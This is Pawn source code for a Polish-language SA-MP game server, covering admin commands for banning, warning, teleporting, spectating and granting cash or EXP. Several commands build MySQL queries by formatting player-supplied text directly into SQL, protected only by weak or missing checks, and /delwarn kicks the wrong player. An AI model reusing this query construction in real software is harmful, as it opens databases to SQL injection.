	if(type < 0 || type > 30) return SendClientMessage(playerid, RED, "Nieprawid³owy czas bana.");
	new msgs[256];
	if(type != 0) {
		new plrIP[16];
		GetPlayerIp(giveid, plrIP, sizeof(plrIP));
	    format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"czasowo zbanowa³ gracza "C_NICK"%s(%d) "C_RED"("C_WHITE"%dd, %s"C_RED")", Player[playerid][Name], playerid, Player[giveid][Name], giveid, type, reason);
		SendClientMessageToAll(RED, msgs);
		SendClientMessage(giveid, RED, "Uwa¿asz, ¿e na³o¿ona kara jest nies³uszna? Z³ó¿ apelacjê na naszym forum: "C_WHITE""FORUM""C_RED".");
		m_query("INSERT INTO bans (uid, bantime, ip, adminname, reason, isperm, expire) VALUES (%d, %d, '%s', '%s', '%s', 0, %d)", Player[giveid][ID], gettime(), plrIP, Player[playerid][Name], reason, gettime() + 86400 * type);
 		DelayedKick(giveid);
	 	bans++; }
	else {
		new plrIP[16];
		GetPlayerIp(giveid, plrIP, sizeof(plrIP));
	    format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"zbanowa³ permanentnie gracza "C_NICK"%s(%d) "C_RED"("C_WHITE"%s"C_RED")", Player[playerid][Name], playerid, Player[giveid][Name], giveid, reason);
		SendClientMessageToAll(RED, msgs);
		SendClientMessage(giveid, RED, "Uwa¿asz, ¿e na³o¿ona kara jest nies³uszna? Z³ó¿ apelacjê na naszym forum: "C_WHITE""FORUM""C_RED".");
		m_query("INSERT INTO bans (uid, bantime, ip, adminname, reason, isperm) VALUES (%d, %d, '%s', '%s', '%s', 1)", Player[giveid][ID], gettime(), plrIP, Player[playerid][Name], reason);
 		DelayedKick(giveid);
	 	bans++; }
	return 1;
}

CMD:unban(playerid, params[]) 
{
    if(SQLInjection(params))
    {
		if(pAch[playerid][1] < 1) {
			pAch[playerid][1] = 1;
			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
		return 1;
    }
    if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/unban [uid/name]");
	if(IsNumeric(params))
	{
  		m_query("SELECT * FROM bans WHERE uid = %d", params);
		mysql_store_result();
		if(mysql_num_rows() > 0)
		{
		    m_query("DELETE FROM bans WHERE uid = %d", params);
			SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Gracz zosta³ odbanowany.");
		}
		else SendClientMessage(playerid, RED, "Gracz o podanym UID nie jest zbanowany.");
		mysql_free_result();
	}
	else
	{
	    if(strfind(params, "'", true)== 0) return SendClientMessage(playerid, RED, "Wyst¹pi³ problem z wykonaniem polecenia.");
	    new ubsql[1024], ubuid;
	    m_query("SELECT id FROM players WHERE username = '%s'", params);
	    mysql_store_result();
	    if(mysql_num_rows() > 0)
	    {
	        mysql_fetch_row(ubsql, " ");
	        mysql_free_result();
	        sscanf(ubsql, "i", ubuid);
   			m_query("SELECT * FROM bans WHERE uid = %d", ubuid);
   			mysql_store_result();
   			if(mysql_num_rows() == 0) {
   			    mysql_free_result();
	   			return SendClientMessage(playerid, RED, "Podany gracz nie jest zbanowany."); }
			else {
			    mysql_free_result();
   				m_query("DELETE FROM bans WHERE uid = %d", ubuid);
				return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Gracz zosta³ odbanowany."); }
	    }
	    else {
			mysql_free_result();
			return SendClientMessage(playerid, RED, "Gracz o podanym nicku nie istnieje."); }
	}
	return 1;
}

CMD:offban(playerid, params[]) 
{
    if(SQLInjection(params)) {
		if(pAch[playerid][1] < 1) {
			pAch[playerid][1] = 1;
			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
		return 1; }
	new giveid, type, reason[32];
  	if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	if(sscanf(params,"iis[32]",giveid,type,reason)) return SyntaxError(playerid, "{01FCFF}/offban [uid] [czas (0=permban)] [powód]");
  	if(strfind(params, "'", true)== 0) return SendClientMessage(playerid, RED, "Wyst¹pi³ problem z wykonaniem polecenia.");
	m_query("SELECT * FROM players WHERE id = %d", giveid);
    mysql_store_result();
    if(mysql_num_rows() < 1) {
        mysql_free_result();
		return SendClientMessage(playerid, RED, "Podany gracz nie istnieje."); }
	mysql_free_result();
	m_query("SELECT uid FROM bans WHERE uid = %d", giveid);
    mysql_store_result();
    if(mysql_num_rows() > 0) {
        mysql_free_result();
		return SendClientMessage(playerid, RED, "Ten gracz jest ju¿ zbanowany."); }
	mysql_free_result();
	new ip[16], query[1024], status, name[20];
	m_query("SELECT ip, playerid, username FROM players WHERE id = %d", giveid);
	mysql_store_result();
	mysql_fetch_row(query, " ");
	mysql_free_result();
	sscanf(query, "s[16]is[20]", ip, status, name);
	if(status > -1) SendClientMessage(playerid, RED, "Podany gracz jest online.");
	if(type < 1) {
		m_query("INSERT INTO bans (uid, bantime, ip, adminname, reason, isperm, expire) VALUES (%d, %d, '%s', '%s', '%s', 1, -1)", giveid, gettime(), ip, Player[playerid][Name], reason);
		new msgs[256];
	   	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"zbanowa³ permanentnie gracza "C_NICK"%s "C_RED"("C_WHITE"%s"C_RED")", Player[playerid][Name], playerid, name, reason);
		SendClientMessageToAll(RED, msgs);
	 	bans++; }
	if(type > 0) {
		m_query("INSERT INTO bans (uid, bantime, ip, adminname, reason, isperm, expire) VALUES (%d, %d, '%s', '%s', '%s', 0, %d)", giveid, gettime(), ip, Player[playerid][Name], reason, gettime() + 86400 * type);
		new msgs[256];
	   	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"czasowo zbanowa³ gracza "C_NICK"%s "C_RED"("C_WHITE"%dd, %s"C_RED")", Player[playerid][Name], playerid, name, type, reason);
		SendClientMessageToAll(RED, msgs);
		bans++; }
	return 1;
}


CMD:eye(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	if(Eye[playerid]) {
		Eye[playerid] = false;
		return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Podgl¹d komend wy³¹czony."); }
	else {
		Eye[playerid] = true;
		return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Podgl¹d komend w³¹czony."); }
}

forward SendClearInfo();
public SendClearInfo()
{
	SendClientMessageToAll(WHITE, clearmsg);
}

CMD:cchat(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	Loop(cc, 40) { SendClientMessageToAll(-1, ""C_WHITE""); }
	SetTimer("SendClearInfo", 300, 0);
	format(clearmsg, sizeof(clearmsg), ""C_NICK"%s(%d) "C_RED"wyczyœci³ czat.", Player[playerid][Name], playerid);
	return 1;
}

CMD:vw(playerid, params[]) 
{
    if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	new giveid, world;
	if(sscanf(params,"ii",giveid, world)) return SyntaxError(playerid, "{01FCFF}/vw [playerid] [worldid]");
	if(!IsPlayerConnected(giveid) || !Player[giveid][IsLoggedIn]) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	SetPlayerVirtualWorld(giveid, world);
   	new msgs[256];
	format(msgs, sizeof(msgs), ""C_RED"Admin "C_NICK"%s(%d) "C_RED"zmieni³ Twój wirtualny œwiat na ID "C_WHITE"%d"C_RED".", Player[playerid][Name], playerid, world);
 	SendClientMessage(giveid, WHITE, msgs);
	return 1;
}

CMD:fullheal(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	new spectateid;
	if(sscanf(params,"i",spectateid)) return SyntaxError(playerid, "{01FCFF}/fullheal [playerid]");
	if(!IsPlayerConnected(spectateid) || !Player[spectateid][IsLoggedIn] || zw[spectateid]) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony lub gracz ma ZW.");
	SetPlayerHealth(spectateid, 100.0);
	return SetPlayerArmour(spectateid, 100.0);
}

CMD:spec(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new spectateid;
	if(sscanf(params,"i",spectateid)) return SyntaxError(playerid, "{01FCFF}/spec [playerid]");
	if(SpectatingPlayer[spectateid] > -1) return DialogError(playerid, "{FFFF00}Ten gracz obserwuje inn¹ osobê.");
	if(!IsPlayerConnected(spectateid) || !Player[spectateid][IsLoggedIn] || zw[spectateid]) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony lub gracz ma ZW.");
	if(spectateid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
	SpectatingPlayer[playerid] = spectateid;
	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(spectateid));
	SetPlayerInterior(playerid, GetPlayerInterior(spectateid));
	SpecToggle(playerid, 1);
	if(IsPlayerInAnyVehicle(spectateid)) return PlayerSpectateVehicle(playerid, GetPlayerVehicleID(spectateid));
	return PlayerSpectatePlayer(playerid, spectateid);
}

CMD:explode(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new spectateid;
	if(sscanf(params,"i",spectateid)) return SyntaxError(playerid, "{01FCFF}/explode [playerid]");
	if(!IsPlayerConnected(spectateid) || !Player[spectateid][IsLoggedIn] || zw[spectateid]) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony lub gracz ma ZW.");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(spectateid, x, y, z);
	return CreateExplosion(x, y, z, 11, 10);
}

CMD:tt(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/tt [playerid]");
	if(!IsPlayerConnected(giveid) || !Player[giveid][IsLoggedIn]) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(giveid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(giveid, x, y, z);
	SetPlayerPos(playerid, x, y, z);
   	new msgs[256];
	format(msgs, sizeof(msgs), ""C_RED"Admin "C_NICK"%s(%d) "C_RED"teleportowa³ siê do Ciebie.", Player[playerid][Name], playerid);
 	SendClientMessage(giveid, WHITE, msgs);
	return 1;
}

CMD:ip(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/ip [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
   	new msgs[256], plrIP[16];
	GetPlayerIp(giveid, plrIP, sizeof(plrIP));
	format(msgs, sizeof(msgs), "{25CFED}IP gracza "C_WHITE"%s(%d){25CFED}: "C_WHITE"%s", Player[giveid][Name], giveid, plrIP);
 	SendClientMessage(playerid, WHITE, msgs);
	return 1;
}

CMD:checkafk(playerid, params[]) 
{
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/checkafk [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
  new msgs[256];
	if(AFKPoints[giveid] < 1) format(msgs, sizeof(msgs), ""C_ORANGE"Punkty aktywnoœci "C_NICK"%s(%d)"C_ORANGE": {FF0000}%d (AFK)", Player[giveid][Name], giveid, AFKPoints[giveid]);
	else format(msgs, sizeof(msgs), ""C_ORANGE"Punkty aktywnoœci "C_NICK"%s(%d)"C_ORANGE": "C_WHITE"%d", Player[giveid][Name], giveid, AFKPoints[giveid]);
 	SendClientMessage(playerid, WHITE, msgs);
	return 1;
}

CMD:th(playerid, params[]) 
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/th [playerid]");
	if(!IsPlayerConnected(giveid) || !Player[giveid][IsLoggedIn]) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(giveid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	SetPlayerPos(giveid, x, y, z);
   	new msgs[256];
	format(msgs, sizeof(msgs), ""C_RED"Admin "C_NICK"%s(%d) "C_RED"teleportowa³ Ciê do siebie.", Player[playerid][Name], playerid);
 	SendClientMessage(giveid, WHITE, msgs);
	return 1;
}

CMD:tpall(playerid, params[]) 
{
    if(Player[playerid][Admin] < 3) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "VHA""C_RED" lub wy¿szej.");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	Loop(loopid, MAX_PLAYERS) { if(IsPlayerConnected(loopid) && loopid != playerid) SetPlayerPos(loopid, x, y, z); }
   	new msgs[256];
	format(msgs, sizeof(msgs), ""C_RED"Admin "C_NICK"%s(%d) "C_RED"teleportowa³ wszystkich do siebie.", Player[playerid][Name], playerid);
 	SendClientMessageToAll(WHITE, msgs);
	return 1;
}

CMD:postaw(playerid, params[]) return cmd_hitman(playerid, params);
CMD:hitman(playerid, params[]) 
{
   	if(GetPVarInt(playerid,"Hit") > gettime()) return DialogError(playerid, "{FFFF00}/hitman mo¿esz u¿ywaæ co minutê.");
    SetPVarInt(playerid,"Hit",gettime()+60);
	new giveid, exp;
	if(sscanf(params,"ii",giveid, exp)) return SyntaxError(playerid, "{01FCFF}/hitman [playerid] [exp]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(giveid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
	if(Player[playerid][Exp] < exp || exp < 1) return SendClientMessage(playerid, RED, "Podano b³êdn¹ iloœæ EXP.");
   	new msgs[256];
 	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) {25CFED}postawi³ "C_WHITE"%d EXP {25cFED}za g³owê "C_WHITE"%s(%d){25CFED}.", Player[playerid][Name], playerid, exp, Player[giveid][Name], giveid);
 	SendClientMessageToAll(WHITE, msgs);
 	Player[playerid][Exp] -= exp;
 	Player[giveid][Hitman] += exp;
  	if(pAch[giveid][17] < 1 && Player[giveid][Hitman] >= 5000) {
		pAch[giveid][17] = 1;
		AddExp(giveid, 200);
		Sound(giveid,1137,0.0,0.0,0.0);
		SendClientMessageEx(giveid, -1, "Nowe osi¹gniêcie: "C_NICK"Poszukiwany", "New achievement: "C_NICK"Poszukiwany"); }
	return 1;
}

CMD:giveexp(playerid, params[]) return cmd_sendexp(playerid, params);
CMD:sendexp(playerid, params[]) 
{
	new giveid, exp;
	if(sscanf(params,"ii",giveid, exp)) return SyntaxError(playerid, "{01FCFF}/sendexp [playerid] [exp]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(giveid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
	if(Player[playerid][Exp] < exp || exp < 1) return SendClientMessage(playerid, RED, "Podano b³êdn¹ iloœæ EXP.");
   	new msgs[256];
	format(msgs, sizeof(msgs), "%s(%d) {25CFED}przekaza³ Ci "C_WHITE"%d EXP{25CFED}!", Player[playerid][Name], playerid, exp);
 	SendClientMessage(giveid, WHITE, msgs);
 	format(msgs, sizeof(msgs), "{25CFED}Przekaza³eœ graczowi "C_WHITE"%s(%d) "C_WHITE"%d EXP{25CFED}.", Player[giveid][Name], giveid, exp);
 	SendClientMessage(playerid, WHITE, msgs);
 	Player[playerid][Exp] -= exp;
 	AddExp(giveid, exp);
	return 1;
}

CMD:addcash(playerid, params[]) 
{
	new giveid, cash;
    if(Player[playerid][Admin] < 3) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "VHA""C_RED".");
	if(sscanf(params,"ii",giveid, cash)) return SyntaxError(playerid, "{01FCFF}/addcash [playerid] [cash]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(cash < 1) return SendClientMessage(playerid, RED, "Podano b³êdn¹ iloœæ gotówki.");
   	new msgs[256];
	format(msgs, sizeof(msgs), "%s(%d) {25CFED}da³ Ci "C_WHITE"%d${25CFED}!", Player[playerid][Name], playerid, cash);
 	SendClientMessage(giveid, WHITE, msgs);
 	format(msgs, sizeof(msgs), "{25CFED}Da³eœ graczowi "C_WHITE"%s(%d) "C_WHITE"%d${25CFED}.", Player[giveid][Name], giveid, cash);
 	SendClientMessage(playerid, WHITE, msgs);
 	Player[giveid][Cash] += cash;
	return 1;
}

CMD:addexp(playerid, params[]) 
{
	new giveid, cash;
    if(Player[playerid][Admin] < 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED".");
	if(sscanf(params,"ii",giveid, cash)) return SyntaxError(playerid, "{01FCFF}/addexp [playerid] [exp]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(cash < 1) return SendClientMessage(playerid, RED, "Podano b³êdn¹ iloœæ EXP.");
   	new msgs[256];
	format(msgs, sizeof(msgs), "%s(%d) {25CFED}da³ Ci "C_WHITE"%d EXP{25CFED}!", Player[playerid][Name], playerid, cash);
 	SendClientMessage(giveid, WHITE, msgs);
 	format(msgs, sizeof(msgs), "{25CFED}Da³eœ graczowi "C_WHITE"%s(%d) "C_WHITE"%d EXP{25CFED}.", Player[giveid][Name], giveid, cash);
 	SendClientMessage(playerid, WHITE, msgs);
 	AddExp(giveid, cash);
	return 1;
}

CMD:givecash(playerid, params[]) return cmd_sendcash(playerid, params);
CMD:sendcash(playerid, params[]) 
{
	new giveid, cash;
	if(sscanf(params,"ii",giveid, cash)) return SyntaxError(playerid, "{01FCFF}/sendcash [playerid] [cash]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(giveid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
	if(Player[playerid][Cash] < cash || cash < 1) return SendClientMessage(playerid, RED, "Podano b³êdn¹ iloœæ gotówki.");
   	new msgs[256];
	format(msgs, sizeof(msgs), "%s(%d) {25CFED}przekaza³ Ci "C_WHITE"%d${25CFED}!", Player[playerid][Name], playerid, cash);
 	SendClientMessage(giveid, WHITE, msgs);
 	format(msgs, sizeof(msgs), "{25CFED}Przekaza³eœ graczowi "C_WHITE"%s(%d) "C_WHITE"%d${25CFED}.", Player[giveid][Name], giveid, cash);
 	SendClientMessage(playerid, WHITE, msgs);
 	Player[playerid][Cash] -= cash;
 	Player[giveid][Cash] += cash;
	return 1;
}

CMD:tpxyz(playerid, params[]) 
{
	new Float:x, Float:y, Float:z;
    if(Player[playerid][Admin] < 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED".");
 	if(sscanf(params, "fff", x, y, z)) return SyntaxError(playerid, "{01FCFF}/tpxyz [x] [y] [z]");
	SetPlayerPos(playerid, x, y, z);
	return 1;
}

CMD:warn(playerid, params[]) 
{
    if(SQLInjection(params))
    {
		if(pAch[playerid][1] < 1) {
			pAch[playerid][1] = 1;
			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
		return 1;
    }
    if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	new giveid, warnl, reason[128];
	if(sscanf(params,"iis[128]",giveid,warnl,reason)) return SyntaxError(playerid, "{01FCFF}/warn [playerid] [procent] [powód]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(Player[giveid][Admin] > Player[playerid][Admin]) return SendClientMessage(playerid, RED, "Podany gracz posiada rangê wy¿sz¹ od Ciebie.");
	if(Player[giveid][Warny] + warnl > 100) return SendClientMessage(playerid, RED, "Nadanie kary o takiej wartoœci spowodowa³oby przekroczenie maksymalnej wartoœci ostrze¿eñ.");
	Player[giveid][Warny] += warnl;
    new msgs[1024];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"ostrze¿ony przez "C_NICK"%s(%d) "C_RED"("C_WHITE"%dp/%dp/100p, %s"C_RED")", Player[giveid][Name], giveid, Player[playerid][Name], playerid, warnl, Player[giveid][Warny], reason);
 	SendClientMessageToAll(WHITE, msgs);
	if(Player[giveid][Warny] > 99) {
		new plrIP[16];
		GetPlayerIp(giveid, plrIP, sizeof(plrIP));
	    format(msgs, sizeof(msgs), ""C_NICK"Serwer "C_RED"czasowo zbanowa³ gracza "C_NICK"%s(%d) "C_RED"("C_WHITE"30d, Ostrze¿enia"C_RED")", Player[giveid][Name], giveid);
		SendClientMessageToAll(RED, msgs);
		bans++;
		SendClientMessage(giveid, RED, "Uwa¿asz, ¿e na³o¿ona kara jest nies³uszna? Z³ó¿ apelacjê na naszym forum: "C_WHITE""FORUM""C_RED".");
		m_query("INSERT INTO bans (uid, bantime, ip, adminname, reason, isperm, expire) VALUES (%d, %d, '%s', 'Serwer', 'Ostrze¿enia', 0, %d)", Player[giveid][ID], gettime(), plrIP, gettime() + 86400 * 30);
 		DelayedKick(giveid); }
	return 1;
}

CMD:delwarn(playerid, params[]) 
{
    if(Player[playerid][Admin] < 2) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "ADMIN""C_RED" lub wy¿szej.");
	new giveid, warnl;
	if(sscanf(params,"iis[128]",giveid,warnl)) return SyntaxError(playerid, "{01FCFF}/delwarn [playerid] [procent]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
	if(Player[giveid][Warny] < warnl || warnl < 1) return SendClientMessage(playerid, RED, "Gracz nie posiada ostrze¿eñ o podanej wartosci.");
    new msgs[256];
	format(msgs, sizeof(msgs), ""C_NICK"%s(%d) "C_RED"zdj¹³ "C_NICK"%s(%d) "C_WHITE"%d "C_RED"procent ostrze¿eñ.", Player[playerid][Name], playerid, Player[giveid][Name], giveid, warnl);
 	SendClientMessageToAll(WHITE, msgs);
	Player[giveid][Warny] -= warnl;
	if(Player[giveid][Warny] > 99) DelayedKick(playerid);
	return 1;
}

CMD:createpart(playerid, params[])
{
	if(Player[playerid][Admin] < 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED"lub wy¿szej.");
	if(parts >= MAX_PARTS) return SendClientMessage(playerid, RED, "Osi¹gniêto limit czêœci samochodowych.");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	m_query("INSERT INTO parts (pid, x, y, z) VALUES (%d, %.3f, %.3f, %.3f)", parts, x, y, z);
	CreatePart(parts, x, y, z);
	parts++;
	new dyskstr[256];
	format(dyskstr, sizeof(dyskstr), ""PLUS""C_LOLIVE"Czêœæ zosta³a dodana. ("C_WHITE"%d"C_LOLIVE"/"C_WHITE"%d"C_LOLIVE")", parts, MAX_PARTS);
	return SendClientMessage(playerid, -1, dyskstr);
}

CMD:createarrow(playerid, params[])
{
	if(Player[playerid][Admin] < 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED"lub wy¿szej.");
	if(arrows >= MAX_ARROWS) return SendClientMessage(playerid, RED, "Osi¹gniêto limit strza³ek na mapie.");
	if(TworzyStrzalke[playerid]) return SendClientMessage(playerid, RED, "Tworzysz ju¿ gdzieœ strza³kê.");
	GetPlayerPos(playerid, TempX[playerid], TempY[playerid], TempZ[playerid]);
	TworzyStrzalke[playerid] = true;
	new dyskstr[256];
	format(dyskstr, sizeof(dyskstr), ""PLUS""C_LOLIVE"Punkt strza³ki gotowy. PrzejdŸ teraz do miejsca, gdzie strza³ka ma przenosiæ, po czym u¿yj "C_WHITE"/arrowend"C_LOLIVE".");
	return SendClientMessage(playerid, -1, dyskstr);
}

CMD:arrowend(playerid, params[])
{
	if(Player[playerid][Admin] < 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED"lub wy¿szej.");
	if(arrows >= MAX_ARROWS) return SendClientMessage(playerid, RED, "Osi¹gniêto limit strza³ek na mapie.");
	if(!TworzyStrzalke[playerid]) return SendClientMessage(playerid, RED, "Nie tworzysz aktualnie ¿adnej strza³ki.");
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/arrowend [name]");
	if(strlen(params) > 32) return SendClientMessage(playerid, RED, "Za d³uga nazwa strza³ki.");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	m_query("INSERT INTO arrows (aid, name, x, y, z, x2, y2, z2) VALUES (%d, '%s', %.3f, %.3f, %.3f, %.3f, %.3f, %.3f)", arrows, params, TempX[playerid], TempY[playerid], TempZ[playerid], x, y, z);
	CreateArrow(arrows, params, TempX[playerid], TempY[playerid], TempZ[playerid], x, y, z);
	arrows++;
	TworzyStrzalke[playerid] = false;
	new dyskstr[256];
	format(dyskstr, sizeof(dyskstr), ""PLUS""C_LOLIVE"Strza³ka stworzona pomyœlnie.");
	return SendClientMessage(playerid, -1, dyskstr);
}

CMD:createipark(playerid, params[])
{
	if(Player[playerid][Admin] < 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED"lub wy¿szej.");
	if(parks >= MAX_PARKS) return SendClientMessage(playerid, RED, "Osi¹gniêto limit ItemParków na mapie.");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
	m_query("INSERT INTO parks (pid, x, y, z) VALUES (%d, %.3f, %.3f, %.3f)", parks, x, y, z);
	CreatePark(parks, x, y, z);
	parks++;
	new parkstr[256];
	format(parkstr, sizeof(parkstr), ""PLUS""C_LOLIVE"ItemPark zosta³ dodany. ("C_WHITE"%d"C_LOLIVE"/"C_WHITE"%d"C_LOLIVE")", parks, MAX_PARKS);
	return SendClientMessage(playerid, -1, parkstr);
}

CMD:createvehicle(playerid, params[])
{
	new Float:x, Float:y, Float:z, Float:a;
	if(Player[playerid][Admin] < 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED"lub wy¿szej.");
	if(lvehicles >= MAX_SVEHICLES) return SendClientMessage(playerid, RED, "Osi¹gniêto limit pojazdów serwerowych na mapie.");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, RED, "Nie jesteœ w ¿adnym pojeŸdzie.");
	GetPlayerPos(playerid, x, y, z);
	new vpose = GetPlayerVehicleID(playerid);
	new vpos = GetVehicleModel(vpose);
	GetVehicleZAngle(vpose, a);
	m_query("INSERT INTO vehicles (vid, model, x, y, z, a) VALUES (%d, %d, %.3f, %.3f, %.3f, %.3f)", lvehicles, vpos, x, y, z, a);
	lvehicles++;
	new pojstr[256];
	format(pojstr, sizeof(pojstr), ""PLUS""C_LOLIVE"Pojazd zosta³ dodany. ("C_WHITE"%d"C_LOLIVE"/"C_WHITE"%d"C_LOLIVE")", lvehicles, MAX_SVEHICLES);
	return SendClientMessage(playerid, -1, pojstr);
}

CMD:createtransport(playerid, params[])
{
	new type;
	if(Player[playerid][Admin] < 4) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "HA""C_RED"lub wy¿szej.");
	if(sscanf(params,"i",type)) return SendClientMessage(playerid, -1, "/createtransport [type (1-4)]");
	if(type > 4 || type < 1) return SendClientMessage(playerid, RED, "Nieprawid³owy typ spedycji.");
	m_query("SELECT id FROM transport WHERE type = %d", type);
	mysql_store_result();
	new transporty = mysql_num_rows();
	if(transporty >= 20) return SendClientMessage(playerid, RED, "Przekroczono limit tras dla tego transportu.");
	cSpedition[playerid] = type;
	return ShowPlayerDialog(playerid,DIALOG_TRANSPORTCREATE, DIALOG_STYLE_INPUT, ""C_BLUE1"Tworzenie spedycji", ""C_WHITE"Wpisz nazwê dla tworzonej spedycji.", "Stwórz", "Zamknij");
}

//-----------------------------------------------------

CMD:naj(playerid, params[]) 
{
   	if(GetPVarInt(playerid,"SiemaNaj") > gettime())
		return SendClientMessage(playerid, RED, "Nie mo¿esz nadu¿ywaæ komend wyœwietlanych na czacie.");
    SetPVarInt(playerid,"SiemaNaj",gettime()+60);
    new msgs[256];
	format(msgs, sizeof(msgs), ""PLUS""C_NICK"%s(%d) "C_LOLIVE"uwa¿a "NAZWA" "C_LOLIVE"za najlepszy serwer.", Player[playerid][Name], playerid);
 	SendClientMessageToAll(WHITE, msgs);
	AddExp(playerid, 10);
	Player[playerid][Cash] += 1000;
